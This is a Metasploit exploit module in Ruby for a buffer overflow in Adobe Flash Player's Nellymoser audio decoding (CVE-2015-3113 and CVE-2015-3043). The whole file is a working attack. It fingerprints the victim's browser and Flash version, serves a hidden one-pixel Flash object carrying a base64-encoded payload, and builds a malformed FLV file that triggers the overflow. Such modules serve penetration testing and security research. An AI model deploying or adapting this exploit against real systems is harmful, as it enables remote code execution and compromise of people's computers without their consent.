##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow',
      'Description'         => %q{
        This module exploits a buffer overflow on Adobe Flash Player when handling nellymoser
        encoded audio inside a FLV video, as exploited in the wild on June 2015. This module
        has been tested successfully on:

        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.160,
        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.160,
        Windows 8.1, Firefox 38.0.5 and Adobe Flash 18.0.0.160,
        Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.466, and
        Ubuntu 14.04.2 LTS, Firefox 35.01, and Adobe Flash 11.2.202.466.

        Note that this exploit is effective against both CVE-2015-3113 and the
        earlier CVE-2015-3043, since CVE-2015-3113 is effectively a regression
        to the same root cause as CVE-2015-3043.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Unknown', # Exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2015-3043'],
          ['CVE', '2015-3113'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-06.html'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-14.html'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/new-adobe-zero-day-shares-same-root-cause-as-older-flaws/'],
          ['URL', 'http://malware.dontneedcoffee.com/2015/06/cve-2015-3113-flash-up-to-1800160-and.html'],
          ['URL', 'http://bobao.360.cn/learning/detail/357.html']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => ['win', 'linux'],
      'Arch'                => [ARCH_X86],
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::LINUX ||
              os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when 'Windows'
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            when 'Linux'
              return true if ua == Msf::HttpClients::FF
            end

            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when 'Windows'
              return true if ver =~ /^18\./ && Gem::Version.new(ver) <= Gem::Version.new('18.0.0.161')
              return true if ver =~ /^17\./ && Gem::Version.new(ver) != Gem::Version.new('17.0.0.169')
            when 'Linux'
              return true if ver =~ /^11\./ && Gem::Version.new(ver) <= Gem::Version.new('11.2.202.466') && Gem::Version.new(ver) != Gem::Version.new('11.2.202.457')
            end

            false
          end
        },
      'Targets'             =>
        [
          [ 'Windows',
            {
              'Platform' => 'win'
            }
          ],
          [ 'Linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Jun 23 2015',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    @flv = create_flv

    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    if request.uri =~ /\.flv$/
      print_status('Sending FLV...')
      send_response(cli, @flv, {'Content-Type'=>'video/x-flv', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]

    if target.name =~ /Windows/
      platform_id = 'win'
    elsif target.name =~ /Linux/
      platform_id = 'linux'
    end

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-3113', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

  def create_flv
    header = ''
    header << 'FLV' # signature
    header << [1].pack('C') # version
    header << [4].pack('C') # Flags: TypeFlagsAudio
    header << [9].pack('N') # DataOffset

    data = ''
    data << "\x68" # fmt = 6 (Nellymoser), SoundRate: 2, SoundSize: 0, SoundType: 0
    data << "\xee" * 0x440 # SoundData

    tag1 = ''
    tag1 << [8].pack('C')  # TagType (audio)
    tag1 << "\x00\x04\x41" # DataSize
    tag1 << "\x00\x00\x1a" # TimeStamp
    tag1 << [0].pack('C')  # TimeStampExtended
    tag1 << "\x00\x00\x00" # StreamID, always 0
    tag1 << data

    body = ''
    body << [0].pack('N') # PreviousTagSize
    body << tag1
    body << [0xeeeeeeee].pack('N') # PreviousTagSize

    flv = ''
    flv << header
    flv << body

    flv
  end
end
